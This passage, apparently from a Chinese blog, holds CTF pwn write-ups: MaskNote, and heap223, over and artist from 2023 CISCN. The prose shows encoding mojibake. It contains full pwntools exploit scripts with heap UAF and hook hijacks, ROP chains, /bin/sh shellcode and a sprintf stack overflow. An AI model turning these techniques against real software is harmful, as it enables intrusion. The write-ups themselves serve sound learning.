class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    t = t + p8(leak[i])</span><br><span class="line">key = u64(t.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base====&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak.clear()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    leak.append(u8(io.recv(<span class="number">1</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    leak[i] = leak[i] ^ leak[i+<span class="number">1</span>]</span><br><span class="line">t = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    t = t + p8(leak[i])</span><br><span class="line">libc_base = u64(t.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x70</span></span><br><span class="line">ld_base = libc_base + <span class="number">0x1ee000</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, p64(key^(heap_base+<span class="number">0xf0</span>)))</span><br><span class="line">add(<span class="string">b&quot;\n&quot;</span>)  <span class="comment">#8</span></span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x100</span>))  <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">magic = libc_base + <span class="number">0x14A0A0</span></span><br><span class="line">add(p64(<span class="number">0</span>)+p64(ld_base+ld.sym[<span class="string">&quot;_rtld_global&quot;</span>]+<span class="number">0xf90</span>))   <span class="comment">#10</span></span><br><span class="line">add(p64(magic)) <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">address = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = address</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rsp = address</span><br><span class="line">frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment"># print(frame)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(p64(<span class="number">0</span>)+p64(ld_base+ld.sym[<span class="string">&quot;_rtld_global&quot;</span>]+<span class="number">0x980</span>)) <span class="comment">#12</span></span><br><span class="line">add(p64(<span class="number">0</span>)*<span class="number">2</span> + p64(ld_base + ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>] + <span class="number">0x988</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) + <span class="built_in">bytes</span>(frame)[<span class="number">0x28</span>:]) <span class="comment"># 13</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0xd0</span>))  <span class="comment"># 14</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xb10</span>))  <span class="comment"># 15</span></span><br><span class="line">add(p64(<span class="number">0</span>) + p64(<span class="number">0x88</span>))  <span class="comment"># 16</span></span><br><span class="line">add(<span class="string">b&quot;\n&quot;</span>)  <span class="comment"># 17</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x44c70</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x121b1d</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x2a4cf</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0xc7f32</span></span><br><span class="line">pop_rcx_rbx_ret = libc_base + <span class="number">0xfc104</span></span><br><span class="line">pop_r8_ret = libc_base + <span class="number">0x148686</span></span><br><span class="line">syscall = libc_base + <span class="number">0x6105a</span></span><br><span class="line"></span><br><span class="line">orw_rop = p64(pop_rdi_ret) + p64(address + <span class="number">0xd0</span>)</span><br><span class="line">orw_rop += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw_rop += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">orw_rop += p64(pop_rdi_ret) + p64(<span class="number">0x80000</span>)</span><br><span class="line">orw_rop += p64(pop_rsi_ret) + p64(<span class="number">0x1000</span>)</span><br><span class="line">orw_rop += p64(pop_rdx_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw_rop += p64(pop_rcx_rbx_ret) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw_rop += p64(pop_r8_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw_rop += p64(libc_base + libc.sym[<span class="string">&#x27;mmap&#x27;</span>])</span><br><span class="line">orw_rop += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw_rop += p64(pop_rsi_ret) + p64(address + <span class="number">0xd8</span>)</span><br><span class="line">orw_rop += p64(pop_rdx_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw_rop += p64(libc_base + libc.sym[<span class="string">&#x27;writev&#x27;</span>])</span><br><span class="line">orw_rop += <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="number">0x80000</span>) + p64(<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.send(orw_rop)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="PATCH"><a href="#PATCH" class="headerlink" title="PATCH"></a>PATCH</h3><p>è¿™é‡Œå­¦ä¸€ä¸‹å¸ˆå‚…çš„ä¿®å¤æ–¹æ³•ï¼Œä¸åˆ©ç”¨ en_frameï¼Œè€Œåˆ©ç”¨ term_procï¼Œè¿™æ˜¯ä¸ªç©ºå‡½æ•°ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102151304.png" alt="image-20230910215121063" style="zoom:50%;" /><p>æ¥ç€çœ‹ä¸€ä¸‹ free æ—¶çš„ç¯å¢ƒï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102156887.png" alt="image-20230910215622844" style="zoom:50%;" /><p>å› æ­¤æ„é€ å¦‚ä¸‹ patchï¼Œè¿™é‡Œä¸èƒ½ç›´æ¥å°† rdi æŒ‡å‘çš„åœ°æ–¹æ¸… 0 ï¼Œæˆ‘ä»¬ä¿ç•™äº† rdi ä¸º heap[i] ä½¿å¾—å…¶åœ¨ jmp _free æ—¶å¾—ä»¥è¢«é‡Šæ”¾ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102216366.png" alt="image-20230910221643316" style="zoom:50%;" /><h2 id="5-MaskNote"><a href="#5-MaskNote" class="headerlink" title="5. MaskNote"></a>5. MaskNote</h2><p>ä¼ªèœå•é¢˜ã€‚æ£€æŸ¥ä¸€ä¸‹é¢˜ç›®çš„ä¿æŠ¤ï¼Œå‘ç° PIE å’Œ Canary ä¿æŠ¤æ²¡å¼€ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111007178.png" alt="image-20230911100719035" style="zoom:50%;" /><p>é¢˜ç›®ä¸€å¼€å§‹ç”³è¯·äº†ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„ç©ºé—´ï¼Œå¯ç”¨äºå†™å…¥ shellcodeï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111005708.png" alt="image-20230911100505587" style="zoom:50%;" /><p>ç„¶åçœ‹ä¸€ä¸‹å…³é”®ä»£ç é€»è¾‘ï¼Œsprintf çš„åŠŸèƒ½å’Œ printf å…¶å®å·®ä¸å¤šï¼ŒåŒºåˆ«åœ¨äº sprintf å°†æ‰“å°ç»“æœè¾“å‡ºåˆ° buf ä¸­ï¼Œè€Œ printf åˆ™æ˜¯å°†ç»“æœè¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œå› æ­¤ sprintf å¾ˆå®¹æ˜“å¯¼è‡´<strong>æ ˆæº¢å‡º</strong>ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111008571.png" alt="image-20230911100828519" style="zoom:50%;" /><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œ<code>check_Mask</code>å‡½æ•°å¯¹ Mask å˜é‡çš„å€¼åšäº†æ£€æŸ¥ï¼Œä½†æœªæ£€æµ‹<code>%c</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»™ Mask èµ‹å€¼<code>%128c</code>æ¥è¾¾æˆæ ˆæº¢å‡ºï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309111014362.png" alt="image-20230911101455306" style="zoom:50%;" /><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨å¸ƒç½®çš„è¿”å›åœ°å€çš„æ—¶å€™ä¸èƒ½ç›´æ¥å†™å…¥<code>0x80808000</code>ï¼Œå› ä¸º sprintf ä¼šè¢« \x00 ç»™æˆªæ–­ï¼Œå¯ä»¥å†™å…¥<code>0x80808010</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./MaskNote&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">name += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mul esi</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rbx,0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov al, 59</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">name = name.ljust(<span class="number">128</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mask = <span class="string">b&#x27;%136c&#x27;</span>+p64(<span class="number">0x80808010</span>)</span><br><span class="line"><span class="comment"># mask = b&#x27;%s%s&#x27;+b&#x27;\x10\x80\x80\x80&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;your name:&quot;</span>, name)</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x401813&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;Mask:&quot;</span>, mask)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Your choice:&gt;&gt;&quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023Ciscnè¥¿å—èµ›åŒº"><a href="#2023Ciscnè¥¿å—èµ›åŒº" class="headerlink" title="2023Ciscnè¥¿å—èµ›åŒº"></a>2023Ciscnè¥¿å—èµ›åŒº</h1><p>å‚è€ƒçš„è¿™ä½çš„<a href="https://bbs.kanxue.com/thread-277650.htm#msg_header_h2_3">[åŸåˆ›]2023ciscnè¥¿å—èµ›åŒºpwn Writeup</a>ã€‚</p><h2 id="1-heap223"><a href="#1-heap223" class="headerlink" title="1. heap223"></a>1. heap223</h2><p>libc2.23 é¢˜ï¼Œç”šæ˜¯æ€€å¿µã€‚é¢˜ç›®è§„å®šäº† 3 ç§å¤§å°çš„å †ï¼šå°äº 0x100 çš„ small_heapï¼Œç­‰äº 0x100 çš„ mid_heapï¼Œå¤§äº 0x100 çš„ big_heapã€‚å¹¶åœ¨ bss æ®µä¸Šç»´æŠ¤å„ç±»å †å—çš„æœ€è¿‘ç”³è¯·çš„ä¸€ä¸ªæŒ‡é’ˆä¸å…¶ size å¤§å°ã€‚</p><p>æ¼æ´åœ¨äºé‡Šæ”¾å †å—çš„ UAFï¼ŒåŒæ—¶ä¹Ÿæ¸…ç©ºäº†å…¶ size å¤§å°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400BF9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please enter which heap you want to delete:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;small_heap + v1) )                    <span class="comment">// åˆ é™¤æŒ‡å®šç±»heap</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;small_heap + v1));</span><br><span class="line">    small_heap_size[v1] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;deleted heap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;illegal index or unmalloc heap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶ä¸” edit åŠŸèƒ½å’Œ show åŠŸèƒ½éƒ½æœ‰é™åˆ¶ï¼šåªèƒ½ edit small_heapï¼Œåªèƒ½ show mid_heapã€‚</p><p>åˆ©ç”¨æµç¨‹ï¼š</p><ol><li><p>ç”³è¯·ä¸€ä¸ª 0x300 çš„å¤§å †å—ï¼Œç”³è¯·ä¸€ä¸ª 0x38 çš„å°å †å—ï¼ˆé˜²æ­¢åˆå¹¶ï¼‰ã€‚</p></li><li><p>é‡Šæ”¾å¤§å †å—ã€‚</p></li><li><p>ç”³è¯·ä¸€ä¸ªä¸­å †å—ï¼Œå¹¶æ³„éœ² libcã€‚</p><p>æ³¨æ„ï¼æ­¤æ—¶ bss æ®µä¸Šç»´æŠ¤çš„ big_heap_ptr å’Œ mid_heap_ptr éƒ½æŒ‡å‘äº†åŒä¸€å¤„ï¼Œå³æœ€åˆçš„å¤§å †å—ã€‚</p></li><li><p>é‡Šæ”¾ä¸­å †å—ã€‚</p><p>æ³¨æ„ï¼æ­¤æ—¶ä¸­å †å—å’Œå‰²è£‚çš„å¤§å †å—åˆåˆå¹¶äº†ã€‚</p></li><li><p>ç”³è¯·ä¸€ä¸ªå°å †å—ã€‚</p><p>æ³¨æ„ï¼æ­¤æ—¶bss æ®µä¸Šç»´æŠ¤çš„ big_heap_ptrã€mid_heap_ptr å’Œ small_heap_ptr éƒ½æŒ‡å‘äº†åŒä¸€å¤„ï¼Œå³æœ€åˆçš„å¤§å †å—ã€‚</p></li><li><p>é‡Šæ”¾å¤§å †å—ï¼Œå®é™…ä¸Šé‡Šæ”¾äº†å°å †å—ï¼Œè€Œæˆ‘ä»¬åˆæœ‰å°å †å—çš„å†™æƒé™ï¼Œæ•…å¯ä»¥ç”³è¯·åˆ° __malloc_hook - 0x23 çš„ä½ç½®ï¼ŒåŠ«æŒä¸º one_gadget å³å¯ã€‚</p></li><li><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ©ç”¨ add å‡½æ•°ä¸­çš„ malloc å¹¶ä¸èƒ½æ»¡è¶³ one_gadget çš„æ¡ä»¶ï¼Œå‡ºé¢˜è€…ç»™æˆ‘ä»¬æä¾›äº†å¦ä¸€ä¸ªè°ƒç”¨äº† malloc çš„å‡½æ•°å…¥å£ï¼Œè§¦å‘å³å¯ï¼Œä¸è¿‡æ‰“ __realloc_hook ä¹Ÿå¯ä»¥ã€‚</p></li></ol><p>EXP å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&quot;input:&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;please enter size of malloc :&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;please enter contents of your heap:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_mid</span>():</span><br><span class="line">    io.sendlineafter(menu, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;please enter which heap you want to delete:&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_small</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(menu, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;please enter what you want to edit:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">help</span>():</span><br><span class="line">    io.sendlineafter(menu, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">show_mid()</span><br><span class="line">leak = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lb = leak - (<span class="number">0x7f97907c4e00</span>-<span class="number">0x7f9790400000</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&gt;&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">malloc_hook = lb + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;anza&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit_small(p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">shell = lb + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;anza&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(shell))</span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>()</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-over"><a href="#2-over" class="headerlink" title="2. over"></a>2. over</h2><p>åˆå§‹åŒ–çš„æ—¶å€™åœ¨ bss ä¸Šæ”¾äº†ä¸ª puts çš„ libc åœ°å€ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309191922051.png" alt="image-20230919192227848" style="zoom:50%;" /><p>å¹¶ä¸”å¯ä»¥è¿›è¡Œæ‰§è¡Œï¼Œè€Œ name æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚æ€è·¯ä¸€ä¸‹å­å°±å˜å¾—å¾ˆæ˜ç¡®ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309191923688.png" alt="image-20230919192305583" style="zoom:50%;" /><p>å¦å¤–è¿˜æœ‰ä¸‰ä¸ªæ“ä½œï¼Œåˆ†åˆ«æ˜¯å¯¹ bss æ®µä¸Šçš„æ•°è¿›è¡ŒåŠ ã€å‡ã€æŠ‘æˆ–ã€‚è€Œæ¼æ´éƒ½å‡ºå¥‡çš„ä¸€è‡´ï¼Œé€‰æ‹©æ•°çš„æ—¶å€™å¯ä»¥ä¸ºè´Ÿå·ï¼Œå¯¼è‡´å¯ä»¥ä¿®æ”¹åˆ° bss ä¸Šçš„å…¶ä»–å€¼ã€‚è®¡ç®— qword_4060 è‡³ puts_addr çš„åç§»ä¸º 10ï¼Œæ•… num ä¸º -2 å³å¯ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309191927687.png" alt="image-20230919192740631" style="zoom:50%;" /><p>libc å·²çŸ¥ï¼Œå› æ­¤åªéœ€è¦å°† puts_addr çš„ä½ç½®å‡å»å›ºå®šåç§»ä¸º systemï¼Œå†è¿›è¡Œè°ƒç”¨å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = libc.sym[<span class="string">&quot;puts&quot;</span>] - libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">name = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">choice = <span class="string">b&#x27;2&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, name)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, choice)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&#x27;-2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="built_in">str</span>(offset).encode())</span><br><span class="line"></span><br><span class="line">choice = <span class="string">b&#x27;4&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, choice)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-artist"><a href="#3-artist" class="headerlink" title="3. artist"></a>3. artist</h2><p>libc 2.31çš„èœå•å †é¢˜ï¼Œä½†å’Œå¾€å¸¸è¿˜æ˜¯æœ‰å¾ˆå¤§å˜åŒ–ã€‚</p><ol><li>åªèƒ½ç”³è¯· 0x80 å¤§å°çš„å †å—ã€‚</li><li>æ‰“å°åŠŸèƒ½å’Œé‡Šæ”¾åŠŸèƒ½ä¸€èµ·ï¼Œæœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸€ç§å…ˆæ‰“å°åé‡Šæ”¾ï¼Œå¦ä¸€ç§ä¿®æ”¹ 0x10 å­—èŠ‚åå†æ‰“å°é‡Šæ”¾ã€‚é‡Šæ”¾ä¸­æ²¡æœ‰ UAFã€‚</li><li>æœ‰ä¸€ä¸ªæ¼æ´ï¼Œå¯ä»¥ç»´æŠ¤æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå †å—æŒ‡é’ˆï¼Œå¹¶ä¸”æ¯æ¬¡è°ƒç”¨éƒ½ä¼šä¿®æ”¹ 0x10 å¤§å°å­—èŠ‚ã€‚</li></ol><p>æ—¢ç„¶èƒ½ç»´æŠ¤ä¸€ä¸ªå·²é‡Šæ”¾çš„å †å—æŒ‡é’ˆå¹¶èƒ½å¯¹å…¶è¿›è¡Œå†™å…¥ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯é™åˆ¶ç‰ˆçš„ UAF æ¼æ´ã€‚</p><p>åˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>ç”³è¯·å‡ ä¸ªå †å—é‡Šæ”¾ä¹‹åï¼Œå†ç”³è¯·å›æ¥ï¼Œæ­¤æ—¶å †å—ä¸­æ®‹ç•™ç€ä¸€äº›å †å—ä¿¡æ¯ã€‚å†æ¬¡é‡Šæ”¾å°±å¯ä»¥æ³„éœ² heap_baseã€‚</li><li>åˆ©ç”¨ UAF åŠ«æŒåˆ° tcacheï¼Œå¡«æ»¡ 0x90 å¤§å°å¯¹åº”çš„å †å—ã€‚</li><li>é‡Šæ”¾å †å—åˆ° unsorted binï¼Œç”³è¯·å›æ¥å†é‡Šæ”¾ï¼Œå¾—åˆ° Libc_baseã€‚</li><li>åˆ©ç”¨ UAF åŠ«æŒ free_hook ä¸º systemã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 